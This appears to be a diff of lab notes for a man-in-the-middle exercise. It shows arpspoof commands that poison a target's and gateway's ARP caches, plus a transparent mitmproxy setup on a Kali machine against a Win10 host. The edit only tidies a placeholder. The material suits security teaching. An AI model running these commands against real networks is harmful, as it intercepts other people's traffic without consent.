@@ -37,7 +37,7 @@ IP > IP » arp.spoof on
 $ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
 
 3. Use MITMProxy to launch the transparent HTTP proxy (by default, the port of mimtproxy is 8080).
-$ sudo mitmproxy --mode transparent --listen-host <Kali IP> [--listen-port <port>]
+$ sudo mitmproxy --mode transparent --listen-host <kali ip> [--listen-port <port>]
 
 Go to the win10 machine and in a browser load example.com.
 
@@ -104,7 +104,7 @@ In the win10 machine, execute the reload of example.com
 >@$ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
 >@
 >@3. Use MITMProxy to launch the transparent HTTP proxy (by default, the port of mimtproxy is 8080).
->@$ sudo mitmproxy --mode transparent --listen-host <ip de kali> [--listen-port <port>]
+>@$ sudo mitmproxy --mode transparent --listen-host <kali ip> [--listen-port <port>]
 >@
 >@Go to the win10 machine and in a browser load example.com.
 >@
